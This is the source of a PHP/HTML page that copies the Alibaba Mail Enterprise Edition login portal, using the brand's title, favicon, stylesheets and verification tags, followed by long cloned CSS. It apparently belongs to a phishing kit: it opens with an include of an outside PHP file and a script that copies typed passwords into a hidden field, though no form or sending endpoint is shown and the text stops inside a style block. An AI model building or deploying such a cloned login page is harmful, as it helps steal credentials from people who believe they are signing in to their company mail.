<?php include '../build.php' ?>

<!DOCTYPE html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<html>

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <!-- 搜狗域名认证 -->
    <meta name="sogou_site_verification" content="kQTzlrEP1n" />
    <!-- 神马域名认证 -->
    <meta name="shenma-site-verification" content="dc03460f07ddbd666c9e02b7f6b5319f_1655273558">
    <meta name="description" content="Alibaba Enterprise Mailbox, built on Aliyun Feitian platform, can be opened as low as 600 RMB. Industry leading enterprise mailbox, 3 minutes open!
    " />
    <meta name="keywords"
        content="Ali Enterprise Mailbox, Purchase Enterprise Mailbox, Purchase Company Mailbox, Aliyun Enterprise Mailbox, Office Mailbox Service, Office Mailbox Registration, Registration Cloud Mailbox" />
    <link rel="shortcut icon" href="https://qiye.aliyun.com/static/0.2.9/images/favicon.ico" type="image/x-icon"/>
    <title>Login Portal_Alibaba Mail Enterprise Edition - Alibaba Cloud</title>
    <link rel="stylesheet" type="text/css" href="https://qiye.aliyun.com/static/0.2.9/login/default/styles/login.css" />
    <!--<link rel="stylesheet" type="text/css" href="https://qiye.aliyun.com/static/0.2.9/login/default/styles/style.css" /> -->

</head>
<style>
      html, body {
            width: 100%;
            height: 100%;
        }

        body {
            min-height: 800px;
        }

        .login_bg_full {
            min-width: 1000px;
        }

        .login_bg_full .content {
            height : auto;
            font-size : 0;
            background-image: none;
            overflow : hidden;
            min-height: 560px;
            max-height: calc(100vh - 124px);
        }

        .content_inner .login_pannel {
            right: 3px;
            top: 17px;
            bottom: 52px;
            border-radius: 8px;
            width: 380px;
            height: 466px;
        }
        .content_inner .login_pannel .login_pannel_bg {
            border-radius: 8px;
        }

        .content_inner .login_pannel .login_pannel_iframe {
            width: 100%;
            height: 100%;
            border: 0;
            padding: 0;
            margin: 0;
            position: relative;
            zoom: 1;
            z-index: 10;
            border-radius: 8px;
            box-shadow: 0px 1px 4px 0px rgba(0, 0, 0, 0.16);
        }

        .login_bg_full .login_pannel {
            top : 80px;
            height: 400px;
        }

        .login_welcome {
            position: absolute;
            top: 60px;
            left: 30px;
            width: 400px;
            height: 300px;
            overflow: hidden;
            background-image: url(https://img.alicdn.com/imgextra/i3/O1CN01Kxlgb51fRszT2K9T8_!!6000000004004-2-tps-316-234.png);
            background-repeat: no-repeat;
            background-position: top left;
            color: #fff;
        }

        .login_welcome {
            position: absolute;
            top: 60px;
            left: 30px;
            width: 400px;
            height: 300px;
            overflow: hidden;
            background-repeat: no-repeat;
            background-position: top left;
            color: #fff;
        }

        .login_bg_full .login_welcome {
            top : 50%;
            margin-top : -150px;
        }

        .login_bg_full .footer {
            position : relative;
            right : 0;
            left : 0;
            width : auto;
            padding-top: 16px;
        }

        #app-body .iBaIgE.iBaIgE {
            line-height: 20px;
            margin-top: 6px;
            color: rgb(255, 82, 25);
            font-size: 14px;
        }

        #app-body .cuwkJk.cuwkJk {
            font-size: 12px;
            height: 56px;
        }

        #app-body .cbrtEg {
            display: flex;
            -webkit-box-pack: center;
            justify-content: center;
            font-size: 14px;
            color: rgba(23, 26, 29, 0.6) !important;
        }

        #app-body .xzQmF.xzQmF {
            display: flex;
            -webkit-box-align: center;
            align-items: center;
            -webkit-box-pack: center;
            justify-content: center;
            height: 56px;
            width: 100%;
            background: rgb(246, 246, 246);
        }

        #app-body .flFuRt.flFuRt {
            display: flex;
            -webkit-box-align: center;
            align-items: center;
            color: rgba(23, 26, 29, 0.4);
            font-size: 14px;
            cursor: default;
        }

        #app-body .iVQbaz.iVQbaz {
            width: 32px;
            height: 32px;
        }

        .css-1ymq82w.ant-app {
            color: rgba(0, 0, 0, 0.88);
            font-size: 14px;
            line-height: 1.5714285714285714;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        }

        .css-1ymq82w[class^="ant-app"], .css-1ymq82w[class*=" ant-app"] {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
            font-size: 14px;
            box-sizing: border-box;
        }

        .header .links_item {
            border: 0 none;
            padding: 0;
        }

        .header .links_item:before {
            content: "";
            display: inline-block;
            width: 1px;
            height: 12px;
            background-color: #dcdcdc;
            vertical-align: middle;
            margin-top: -8px;
        }

        .header .language_select
         {
            border: unset;
            font-size: 12px;
            color: #848585;
            outline: none;
            padding: 0 12px 0 8px;
        }
        .header .language_select:before{
            content: "";
            display: inline-block;
            width: 1px;
            height: 12px;
            background-color: #dcdcdc;
            vertical-align: middle;
            margin-top: -8px;
        }
        .select_width_reference {
            visibility: hidden;
            white-space: nowrap;
            position: absolute;
            top: -9999px;
            left: -9999px;
            font-size: 12px;
        }
        .header .links_item_first:before {
            background-color: transparent;
        }

        .header .logo {
            left: 0;
        }

        .content_inner .login_company_desc {
            left: 0;
            top: 80px;
        }

        .login_bg_full .content_inner {
            position: absolute;
            top: 0;
            left: 50%;
            margin-left: -500px;
        }

        .header .links_wrap {
            font-size: 0;
            bottom: 14px;
            right: 0;
        }

        .links_item a {
            font-size: 12px;
            padding: 0 12px;
        }

        .login_bg_full #page {
            height: 100%;
            position: relative;
        }

        .login_full_image {
            width: 100%;
            position: relative;
            top: 0;
            left: 0;
        }
        .alimail-seo{
            display:none;
        }

        .content {
            background-color: rgb(200, 232, 255);
            background-image: url(https://img.alicdn.com/imgextra/i1/O1CN01aRVB8w1T5ByWOzSGa_!!6000000002330-2-tps-1280-500.png);
            display: block;
        }

        .content {
            position: relative;
            zoom: 1;
            width: 100%;
            height: 500px;
            background-position: center top;
            background-repeat: no-repeat;
        }

        .anticon {
            display: inline-flex;
            align-Items: center;
            color: inherit;
            font-style: normal;
            line-height: 0;
            text-align: center;
            text-transform: none;
            vertical-align: -0.125em;
            text-rendering: optimizeLegibility;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .anticon>* {
            line-height: 1;
        }

        .anticon svg {
            display: inline-block;
        }

        .anticon::before {
            display: none;
        }

        .anticon .anticon-icon {
            display: block;
        }

        .anticon[tabindex] {
            cursor: pointer;
        }

        .anticon-spin::before,
        .anticon-spin {
            display: inline-block;
            -webkit-animation: loadingCircle 1s infinite linear;
            animation: loadingCircle 1s infinite linear;
        }

        @-webkit-keyframes loadingCircle {
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        @keyframes loadingCircle {
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        .anticon {
            display: inline-flex;
            align-items: center;
            color: inherit;
            font-style: normal;
            line-height: 0;
            text-align: center;
            text-transform: none;
            vertical-align: -0.125em;
            text-rendering: optimizeLegibility;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .anticon>* {
            line-height: 1;
        }

        .anticon svg {
            display: inline-block;
        }

        .anticon .anticon-icon {
            display: block;
        }

        .css-1ymq82w a {
            color: #1677ff;
            text-decoration: none;
            background-color: transparent;
            outline: none;
            cursor: pointer;
            transition: color 0.3s;
            -webkit-text-decoration-skip: objects;
        }

        .css-1ymq82w a:hover {
            color: #69b1ff;
        }

        .css-1ymq82w a:active {
            color: #0958d9;
        }

        .css-1ymq82w a:active,
        .css-1ymq82w a:hover {
            text-decoration: none;
            outline: 0;
        }

        .css-1ymq82w a:focus {
            text-decoration: none;
            outline: 0;
        }

        .css-1ymq82w a[disabled] {
            color: rgba(0, 0, 0, 0.25);
            cursor: not-allowed;
        }

        .css-1ymq82w[class^="ant-app"],
        .css-1ymq82w[class*=" ant-app"] {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
            font-size: 14px;
            box-sizing: border-box;
        }

        .css-1ymq82w[class^="ant-app"]::before,
        .css-1ymq82w[class*=" ant-app"]::before,
        .css-1ymq82w[class^="ant-app"]::after,
        .css-1ymq82w[class*=" ant-app"]::after {
            box-sizing: border-box;
        }

        .css-1ymq82w[class^="ant-app"] [class^="ant-app"],
        .css-1ymq82w[class*=" ant-app"] [class^="ant-app"],
        .css-1ymq82w[class^="ant-app"] [class*=" ant-app"],
        .css-1ymq82w[class*=" ant-app"] [class*=" ant-app"] {
            box-sizing: border-box;
        }

        .css-1ymq82w[class^="ant-app"] [class^="ant-app"]::before,
        .css-1ymq82w[class*=" ant-app"] [class^="ant-app"]::before,
        .css-1ymq82w[class^="ant-app"] [class*=" ant-app"]::before,
        .css-1ymq82w[class*=" ant-app"] [class*=" ant-app"]::before,
        .css-1ymq82w[class^="ant-app"] [class^="ant-app"]::after,
        .css-1ymq82w[class*=" ant-app"] [class^="ant-app"]::after,
        .css-1ymq82w[class^="ant-app"] [class*=" ant-app"]::after,
        .css-1ymq82w[class*=" ant-app"] [class*=" ant-app"]::after {
            box-sizing: border-box;
        }

        .css-1ymq82w.ant-app {
            color: rgba(0, 0, 0, 0.88);
            font-size: 14px;
            line-height: 1.5714285714285714;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        }

        .css-1ymq82w[class^="ant-message"],
        .css-1ymq82w[class*=" ant-message"] {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
            font-size: 14px;
            box-sizing: border-box;
        }

        .css-1ymq82w[class^="ant-message"]::before,
        .css-1ymq82w[class*=" ant-message"]::before,
        .css-1ymq82w[class^="ant-message"]::after,
        .css-1ymq82w[class*=" ant-message"]::after {
            box-sizing: border-box;
        }

        .css-1ymq82w[class^="ant-message"] [class^="ant-message"],
        .css-1ymq82w[class*=" ant-message"] [class^="ant-message"],
        .css-1ymq82w[class^="ant-message"] [class*=" ant-message"],
        .css-1ymq82w[class*=" ant-message"] [class*=" ant-message"] {
            box-sizing: border-box;
        }

        .css-1ymq82w[class^="ant-message"] [class^="ant-message"]::before,
        .css-1ymq82w[class*=" ant-message"] [class^="ant-message"]::before,
        .css-1ymq82w[class^="ant-message"] [class*=" ant-message"]::before,
        .css-1ymq82w[class*=" ant-message"] [class*=" ant-message"]::before,
        .css-1ymq82w[class^="ant-message"] [class^="ant-message"]::after,
        .css-1ymq82w[class*=" ant-message"] [class^="ant-message"]::after,
        .css-1ymq82w[class^="ant-message"] [class*=" ant-message"]::after,
        .css-1ymq82w[class*=" ant-message"] [class*=" ant-message"]::after {
            box-sizing: border-box;
        }

        .css-1ymq82w.ant-message {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            color: rgba(0, 0, 0, 0.88);
            font-size: 14px;
            line-height: 1.5714285714285714;
            list-style: none;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
            position: fixed;
            top: 8px;
            width: 100%;
            pointer-events: none;
            z-index: 1010;
        }

        .css-1ymq82w.ant-message .ant-message-move-up {
            animation-fill-mode: forwards;
        }

        .css-1ymq82w.ant-message .ant-message-move-up-appear,
        .css-1ymq82w.ant-message .ant-message-move-up-enter {
            animation-name: css-1ymq82w-MessageMoveIn;
            animation-duration: 0.3s;
            animation-play-state: paused;
            animation-timing-function: cubic-bezier(0.78, 0.14, 0.15, 0.86);
        }

        .css-1ymq82w.ant-message .ant-message-move-up-appear.ant-message-move-up-appear-active,
        .css-1ymq82w.ant-message .ant-message-move-up-enter.ant-message-move-up-enter-active {
            animation-play-state: running;
        }

        .css-1ymq82w.ant-message .ant-message-move-up-leave {
            animation-name: css-1ymq82w-MessageMoveOut;
            animation-duration: 0.3s;
            animation-play-state: paused;
            animation-timing-function: cubic-bezier(0.78, 0.14, 0.15, 0.86);
        }

        .css-1ymq82w.ant-message .ant-message-move-up-leave.ant-message-move-up-leave-active {
            animation-play-state: running;
        }

        .css-1ymq82w.ant-message-rtl {
            direction: rtl;
        }

        .css-1ymq82w.ant-message-rtl span {
            direction: rtl;
        }

        .css-1ymq82w.ant-message-notice {
            padding: 8px;
            text-align: center;
        }

        .css-1ymq82w.ant-message-notice .anticon {
            vertical-align: text-bottom;
            margin-right: 8px;
            font-size: 16px;
        }

        .css-1ymq82w.ant-message-notice .ant-message-notice-content {
            display: inline-block;
            padding: 9px 12px;
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 6px 16px 0 rgba(0, 0, 0, 0.08), 0 3px 6px -4px rgba(0, 0, 0, 0.12), 0 9px 28px 8px rgba(0, 0, 0, 0.05);
            pointer-events: all;
        }

        .css-1ymq82w.ant-message-notice .ant-message-success .anticon {
            color: #52c41a;
        }

        .css-1ymq82w.ant-message-notice .ant-message-error .anticon {
            color: #ff4d4f;
        }

        .css-1ymq82w.ant-message-notice .ant-message-warning .anticon {
            color: #faad14;
        }

        .css-1ymq82w.ant-message-notice .ant-message-info .anticon,
        .css-1ymq82w.ant-message-notice .ant-message-loading .anticon {
            color: #1677ff;
        }

        .css-1ymq82w.ant-message-notice-pure-panel {
            padding: 0;
            text-align: start;
        }

        @keyframes css-1ymq82w-MessageMoveIn {
            0% {
                padding: 0;
                transform: translateY(-100%);
                opacity: 0;
            }

            100% {
                padding: 8px;
                transform: translateY(0);
                opacity: 1;
            }
        }

        @keyframes css-1ymq82w-MessageMoveOut {
            0% {
                max-height: 150px;
                padding: 8px;
                opacity: 1;
            }

            100% {
                max-height: 0;
                padding: 0;
                opacity: 0;
            }
        }
</style>
<style>
    .css-1ymq82w[class^="ant-notification"],
    .css-1ymq82w[class*=" ant-notification"] {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-size: 14px;
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-notification"]::before,
    .css-1ymq82w[class*=" ant-notification"]::before,
    .css-1ymq82w[class^="ant-notification"]::after,
    .css-1ymq82w[class*=" ant-notification"]::after {
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-notification"] [class^="ant-notification"],
    .css-1ymq82w[class*=" ant-notification"] [class^="ant-notification"],
    .css-1ymq82w[class^="ant-notification"] [class*=" ant-notification"],
    .css-1ymq82w[class*=" ant-notification"] [class*=" ant-notification"] {
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-notification"] [class^="ant-notification"]::before,
    .css-1ymq82w[class*=" ant-notification"] [class^="ant-notification"]::before,
    .css-1ymq82w[class^="ant-notification"] [class*=" ant-notification"]::before,
    .css-1ymq82w[class*=" ant-notification"] [class*=" ant-notification"]::before,
    .css-1ymq82w[class^="ant-notification"] [class^="ant-notification"]::after,
    .css-1ymq82w[class*=" ant-notification"] [class^="ant-notification"]::after,
    .css-1ymq82w[class^="ant-notification"] [class*=" ant-notification"]::after,
    .css-1ymq82w[class*=" ant-notification"] [class*=" ant-notification"]::after {
        box-sizing: border-box;
    }

    .css-1ymq82w.ant-notification {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        color: rgba(0, 0, 0, 0.88);
        font-size: 14px;
        line-height: 1.5714285714285714;
        list-style: none;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        position: fixed;
        z-index: 1050;
        margin-right: 24px;
    }

    .css-1ymq82w.ant-notification .ant-notification-hook-holder {
        position: relative;
    }

    .css-1ymq82w.ant-notification.ant-notification-top,
    .css-1ymq82w.ant-notification.ant-notification-bottom {
        margin-left: 0;
        margin-right: 0;
    }

    .css-1ymq82w.ant-notification.ant-notification-topLeft,
    .css-1ymq82w.ant-notification.ant-notification-bottomLeft {
        margin-right: 0;
        margin-left: 24px;
    }

    .css-1ymq82w.ant-notification.ant-notification-topLeft .ant-notification-fade-enter.ant-notification-fade-enter-active,
    .css-1ymq82w.ant-notification.ant-notification-bottomLeft .ant-notification-fade-enter.ant-notification-fade-enter-active,
    .css-1ymq82w.ant-notification.ant-notification-topLeft .ant-notification-fade-appear.ant-notification-fade-appear-active,
    .css-1ymq82w.ant-notification.ant-notification-bottomLeft .ant-notification-fade-appear.ant-notification-fade-appear-active {
        animation-name: css-1ymq82w-antNotificationLeftFadeIn;
    }

    .css-1ymq82w.ant-notification .ant-notification-fade-enter,
    .css-1ymq82w.ant-notification .ant-notification-fade-appear {
        animation-duration: 0.2s;
        animation-timing-function: cubic-bezier(0.645, 0.045, 0.355, 1);
        animation-fill-mode: both;
        opacity: 0;
        animation-play-state: paused;
    }

    .css-1ymq82w.ant-notification .ant-notification-fade-leave {
        animation-timing-function: cubic-bezier(0.645, 0.045, 0.355, 1);
        animation-fill-mode: both;
        animation-duration: 0.2s;
        animation-play-state: paused;
    }

    .css-1ymq82w.ant-notification .ant-notification-fade-enter.ant-notification-fade-enter-active,
    .css-1ymq82w.ant-notification .ant-notification-fade-appear.ant-notification-fade-appear-active {
        animation-name: css-1ymq82w-antNotificationFadeIn;
        animation-play-state: running;
    }

    .css-1ymq82w.ant-notification .ant-notification-fade-leave.ant-notification-fade-leave-active {
        animation-name: css-1ymq82w-antNotificationFadeOut;
        animation-play-state: running;
    }

    .css-1ymq82w.ant-notification.ant-notification-top .ant-notification-fade-enter.ant-notification-fade-enter-active,
    .css-1ymq82w.ant-notification.ant-notification-top .ant-notification-fade-appear.ant-notification-fade-appear-active {
        animation-name: css-1ymq82w-antNotificationTopFadeIn;
    }

    .css-1ymq82w.ant-notification.ant-notification-bottom .ant-notification-fade-enter.ant-notification-fade-enter-active,
    .css-1ymq82w.ant-notification.ant-notification-bottom .ant-notification-fade-appear.ant-notification-fade-appear-active {
        animation-name: css-1ymq82w-antNotificationBottomFadeIn;
    }

    .css-1ymq82w.ant-notification-rtl {
        direction: rtl;
    }

    .css-1ymq82w.ant-notification-rtl .ant-notification-notice-btn {
        float: left;
    }

    .css-1ymq82w.ant-notification-notice {
        position: relative;
        width: 384px;
        max-width: calc(100vw - 48px);
        margin-bottom: 16px;
        margin-left: auto;
        padding: 20px 24px;
        overflow: hidden;
        line-height: 1.5714285714285714;
        word-wrap: break-word;
        background: #ffffff;
        border-radius: 8px;
        box-shadow: 0 6px 16px 0 rgba(0, 0, 0, 0.08), 0 3px 6px -4px rgba(0, 0, 0, 0.12), 0 9px 28px 8px rgba(0, 0, 0, 0.05);
    }

    .css-1ymq82w.ant-notification-notice .ant-notification-close-icon {
        font-size: 14px;
        cursor: pointer;
    }

    .css-1ymq82w.ant-notification-notice .ant-notification-notice-message {
        margin-bottom: 8px;
        color: rgba(0, 0, 0, 0.88);
        font-size: 16px;
        line-height: 1.5;
    }

    .css-1ymq82w.ant-notification-notice .ant-notification-notice-description {
        font-size: 14px;
    }

    .css-1ymq82w.ant-notification-notice.ant-notification-notice-closable .ant-notification-notice-message {
        padding-right: 24px;
    }

    .css-1ymq82w.ant-notification-notice .ant-notification-notice-with-icon .ant-notification-notice-message {
        margin-bottom: 8px;
        margin-left: 36px;
        font-size: 16px;
    }

    .css-1ymq82w.ant-notification-notice .ant-notification-notice-with-icon .ant-notification-notice-description {
        margin-left: 36px;
        font-size: 14px;
    }

    .css-1ymq82w.ant-notification-notice .ant-notification-notice-icon {
        position: absolute;
        font-size: 24px;
        line-height: 0;
    }

    .css-1ymq82w.ant-notification-notice .ant-notification-notice-icon-success.anticon {
        color: #52c41a;
    }

    .css-1ymq82w.ant-notification-notice .ant-notification-notice-icon-info.anticon {
        color: #1677ff;
    }

    .css-1ymq82w.ant-notification-notice .ant-notification-notice-icon-warning.anticon {
        color: #faad14;
    }

    .css-1ymq82w.ant-notification-notice .ant-notification-notice-icon-error.anticon {
        color: #ff4d4f;
    }

    .css-1ymq82w.ant-notification-notice .ant-notification-notice-close {
        position: absolute;
        top: 20px;
        right: 24px;
        color: rgba(0, 0, 0, 0.45);
        outline: none;
        width: 22px;
        height: 22px;
        border-radius: 4px;
        transition: background-color 0.2s, color 0.2s;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .css-1ymq82w.ant-notification-notice .ant-notification-notice-close:hover {
        color: rgba(0, 0, 0, 0.88);
        background-color: rgba(0, 0, 0, 0.06);
    }

    .css-1ymq82w.ant-notification-notice .ant-notification-notice-btn {
        float: right;
        margin-top: 12px;
    }

    .css-1ymq82w.ant-notification-notice-pure-panel {
        margin: 0;
    }
</style>
<style>
    .css-1ymq82w[class^="ant-spin"],
    .css-1ymq82w[class*=" ant-spin"] {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-size: 14px;
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-spin"]::before,
    .css-1ymq82w[class*=" ant-spin"]::before,
    .css-1ymq82w[class^="ant-spin"]::after,
    .css-1ymq82w[class*=" ant-spin"]::after {
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-spin"] [class^="ant-spin"],
    .css-1ymq82w[class*=" ant-spin"] [class^="ant-spin"],
    .css-1ymq82w[class^="ant-spin"] [class*=" ant-spin"],
    .css-1ymq82w[class*=" ant-spin"] [class*=" ant-spin"] {
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-spin"] [class^="ant-spin"]::before,
    .css-1ymq82w[class*=" ant-spin"] [class^="ant-spin"]::before,
    .css-1ymq82w[class^="ant-spin"] [class*=" ant-spin"]::before,
    .css-1ymq82w[class*=" ant-spin"] [class*=" ant-spin"]::before,
    .css-1ymq82w[class^="ant-spin"] [class^="ant-spin"]::after,
    .css-1ymq82w[class*=" ant-spin"] [class^="ant-spin"]::after,
    .css-1ymq82w[class^="ant-spin"] [class*=" ant-spin"]::after,
    .css-1ymq82w[class*=" ant-spin"] [class*=" ant-spin"]::after {
        box-sizing: border-box;
    }

    .css-1ymq82w.ant-spin {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        color: #1677ff;
        font-size: 14px;
        line-height: 1.5714285714285714;
        list-style: none;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        position: absolute;
        display: none;
        text-align: center;
        vertical-align: middle;
        opacity: 0;
        transition: transform 0.3s cubic-bezier(0.78, 0.14, 0.15, 0.86);
    }

    .css-1ymq82w.ant-spin-spinning {
        position: static;
        display: inline-block;
        opacity: 1;
    }

    .css-1ymq82w.ant-spin-nested-loading {
        position: relative;
    }

    .css-1ymq82w.ant-spin-nested-loading>div>.ant-spin {
        position: absolute;
        top: 0;
        left: 0;
        z-index: 4;
        display: block;
        width: 100%;
        height: 100%;
        max-height: 400px;
    }

    .css-1ymq82w.ant-spin-nested-loading>div>.ant-spin .ant-spin-dot {
        position: absolute;
        top: 50%;
        left: 50%;
        margin: -10px;
    }

    .css-1ymq82w.ant-spin-nested-loading>div>.ant-spin .ant-spin-text {
        position: absolute;
        top: 50%;
        width: 100%;
        padding-top: 5px;
        text-shadow: 0 1px 2px #ffffff;
    }

    .css-1ymq82w.ant-spin-nested-loading>div>.ant-spin.ant-spin-show-text .ant-spin-dot {
        margin-top: -20px;
    }

    .css-1ymq82w.ant-spin-nested-loading>div>.ant-spin-sm .ant-spin-dot {
        margin: -7px;
    }

    .css-1ymq82w.ant-spin-nested-loading>div>.ant-spin-sm .ant-spin-text {
        padding-top: 2px;
    }

    .css-1ymq82w.ant-spin-nested-loading>div>.ant-spin-sm.ant-spin-show-text .ant-spin-dot {
        margin-top: -17px;
    }

    .css-1ymq82w.ant-spin-nested-loading>div>.ant-spin-lg .ant-spin-dot {
        margin: -16px;
    }

    .css-1ymq82w.ant-spin-nested-loading>div>.ant-spin-lg .ant-spin-text {
        padding-top: 11px;
    }

    .css-1ymq82w.ant-spin-nested-loading>div>.ant-spin-lg.ant-spin-show-text .ant-spin-dot {
        margin-top: -26px;
    }

    .css-1ymq82w.ant-spin-nested-loading .ant-spin-container {
        position: relative;
        transition: opacity 0.3s;
    }

    .css-1ymq82w.ant-spin-nested-loading .ant-spin-container::after {
        position: absolute;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        z-index: 10;
        width: 100%;
        height: 100%;
        background: #ffffff;
        opacity: 0;
        transition: all 0.3s;
        content: "";
        pointer-events: none;
    }

    .css-1ymq82w.ant-spin-nested-loading .ant-spin-blur {
        clear: both;
        opacity: 0.5;
        user-select: none;
        pointer-events: none;
    }

    .css-1ymq82w.ant-spin-nested-loading .ant-spin-blur::after {
        opacity: 0.4;
        pointer-events: auto;
    }

    .css-1ymq82w.ant-spin-tip {
        color: rgba(0, 0, 0, 0.45);
    }

    .css-1ymq82w.ant-spin .ant-spin-dot {
        position: relative;
        display: inline-block;
        font-size: 20px;
        width: 1em;
        height: 1em;
    }

    .css-1ymq82w.ant-spin .ant-spin-dot-item {
        position: absolute;
        display: block;
        width: 9px;
        height: 9px;
        background-color: #1677ff;
        border-radius: 100%;
        transform: scale(0.75);
        transform-origin: 50% 50%;
        opacity: 0.3;
        animation-name: css-1ymq82w-antSpinMove;
        animation-duration: 1s;
        animation-iteration-count: infinite;
        animation-timing-function: linear;
        animation-direction: alternate;
    }

    .css-1ymq82w.ant-spin .ant-spin-dot-item:nth-child(1) {
        top: 0;
        left: 0;
    }

    .css-1ymq82w.ant-spin .ant-spin-dot-item:nth-child(2) {
        top: 0;
        right: 0;
        animation-delay: 0.4s;
    }

    .css-1ymq82w.ant-spin .ant-spin-dot-item:nth-child(3) {
        right: 0;
        bottom: 0;
        animation-delay: 0.8s;
    }

    .css-1ymq82w.ant-spin .ant-spin-dot-item:nth-child(4) {
        bottom: 0;
        left: 0;
        animation-delay: 1.2s;
    }

